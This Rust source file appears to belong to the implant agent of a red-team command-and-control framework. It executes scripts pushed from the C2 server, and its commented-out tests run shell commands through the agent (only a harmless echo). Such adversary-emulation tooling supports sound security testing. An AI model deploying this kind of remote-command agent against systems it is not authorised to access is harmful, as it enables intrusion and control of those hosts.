use anyhow::{Error, Result};
use c2::pb::c2_manual_client::TavernClient;
use c2::pb::Task;
use chrono::{DateTime, Utc};
use eldritch::{eldritch_run, EldritchPrintHandler};
use std::sync::mpsc::Receiver;
use std::sync::mpsc::Sender;
use std::thread;
use tokio::task::JoinHandle;
use tokio::time::Duration;

pub struct AsyncTask {
    pub future_join_handle: JoinHandle<Result<(), Error>>,
    pub start_time: DateTime<Utc>,
    pub grpc_task: Task,
    pub print_reciever: Receiver<String>,
    pub error_reciever: Receiver<String>,
}

async fn handle_exec_tome(
    task: Task,
    print_channel_sender: Sender<String>,
    tavern_client: TavernClient,
) -> Result<(String, String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    // let task_quest = match task.quest {
    //     Some(quest) => quest,
    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
    // };

    let print_handler = EldritchPrintHandler {
        sender: print_channel_sender,
    };

    // Execute a tome script
    let res = match thread::spawn(move || {
        eldritch_run(
            task.id.to_string(),
            task.eldritch.clone(),
            Some(task.parameters.clone()),
            &print_handler,
            tavern_client,
        )
    })
    .join()
    {
        Ok(local_thread_res) => local_thread_res,
        Err(_) => todo!(),
    };
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

pub async fn handle_exec_timeout_and_response(
    task: Task,
    print_channel_sender: Sender<String>,
    error_channel_sender: Sender<String>,
    timeout: Option<Duration>,
    tavern_client: TavernClient,
) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = timeout.unwrap_or_else(|| Duration::from_secs(60 * 60 * 24 * 7));

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone(), tavern_client);
    // Execute that future with a timeout defined by the timeout argument.
    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => match res {
            Ok(tome_result) => tome_result,
            Err(tome_error) => ("".to_string(), tome_error.to_string()),
        },
        Err(timer_elapsed) => (
            "".to_string(),
            format!(
                "Time elapsed task {} has been running for {} seconds",
                task.id,
                timer_elapsed.to_string()
            ),
        ),
    };

    print_channel_sender
        .clone()
        .send(format!("---[RESULT]----\n{}\n---------", tome_result.0))?;
    print_channel_sender // Temporary - pending UI updates
        .clone()
        .send(format!("---[ERROR]----\n{}\n--------", tome_result.1))?;
    error_channel_sender.clone().send(tome_result.1)?;
    Ok(())
}

// #[cfg(test)]
// mod tests {
//     use crate::tasks::drain_sender;

//     use super::{handle_exec_timeout_and_response, handle_exec_tome};
//     use anyhow::Result;
//     use c2::pb::Task;
//     use std::collections::HashMap;
//     use std::sync::mpsc::channel;
//     use std::time::Duration;

//     #[test]
//     fn imix_handle_exec_tome() -> Result<()> {
//         let test_tome_input = Task {
//             id: 123,
//             eldritch: r#"
// print(sys.shell(input_params["cmd"])["stdout"])
// 1"#
//             .to_string(),
//             parameters: HashMap::from([("cmd".to_string(), "echo hello_from_stdout".to_string())]),
//             file_names: Vec::new(),
//             quest_name: "test_quest".to_string(),
//         };

//         let runtime = tokio::runtime::Builder::new_multi_thread()
//             .enable_all()
//             .build()
//             .unwrap();

//         let (sender, receiver) = channel::<String>();

//         let exec_future = handle_exec_tome(test_tome_input, sender.clone(), tavern_client);
//         let (eld_output, eld_error) = runtime.block_on(exec_future)?;

//         let cmd_output = receiver.recv_timeout(Duration::from_millis(500))?;
//         assert!(cmd_output.contains("hello_from_stdout"));
//         assert_eq!(eld_output, "1".to_string());
//         assert_eq!(eld_error, "".to_string());
//         Ok(())
//     }

// //     #[tokio::test]
//     async fn imix_handle_exec_tome_error() -> Result<()> {
//         let (print_sender, print_reciever) = channel::<String>();
//         let (error_sender, error_reciever) = channel::<String>();
//         let _res = handle_exec_timeout_and_response(
//             Task {
//                 id: 123,
//                 eldritch: r#"print(no_var)
// "#
//                 .to_string(),
//                 parameters: HashMap::from([]),
//                 file_names: Vec::from([]),
//                 quest_name: "Poggers".to_string(),
//             },
//             print_sender,
//             error_sender,
//             None,
//         )
//         .await?;

//         let task_channel_error = drain_sender(&error_reciever)?;
//         let _task_channel_output = drain_sender(&print_reciever)?;

//         assert!(task_channel_error.contains(&"Variable `no_var` not found".to_string()));
//         Ok(())
//     }

//     // This test
//     //     #[test]
//     //     fn imix_handle_exec_tome_timeout() -> Result<()> {
//     //         let test_tome_input = Task {
//     //             id: 123,
//     //             eldritch: r#"
//     // print("Hello_world")
//     // time.sleep(5)
//     // "#
//     //             .to_string(),
//     //             parameters: HashMap::new(),
//     //         };

//     //         let runtime: tokio::runtime::Runtime = tokio::runtime::Builder::new_multi_thread()
//     //             .enable_all()
//     //             .build()
//     //             .unwrap();

//     //         let (sender, receiver) = channel::<String>();

//     //         let start_time = Instant::now();
//     //         let exec_future = handle_exec_timeout_and_response(
//     //             test_tome_input,
//     //             sender.clone(),
//     //             Some(Duration::from_secs(2)),
//     //         );
//     //         runtime.block_on(exec_future)?;
//     //         let end_time = Instant::now();
//     //         let mut index = 0;
//     //         loop {
//     //             let cmd_output = match receiver.recv_timeout(Duration::from_millis(800)) {
//     //                 Ok(local_res_string) => local_res_string,
//     //                 Err(local_err) => {
//     //                     match local_err.to_string().as_str() {
//     //                         "channel is empty and sending half is closed" => {
//     //                             break;
//     //                         }
//     //                         "timed out waiting on channel" => break,
//     //                         _ => eprint!("Error: {}", local_err),
//     //                     }
//     //                     break;
//     //                 }
//     //             };
//     //             println!("eld_output: {}", cmd_output);
//     //             index = index + 1;
//     //         }

//     //         println!(
//     //             "Diff {:?}",
//     //             end_time.checked_duration_since(start_time).unwrap()
//     //         );
//     //         assert!(end_time.checked_duration_since(start_time).unwrap() < Duration::from_secs(3));

//     //         Ok(())
//     //     }
// }
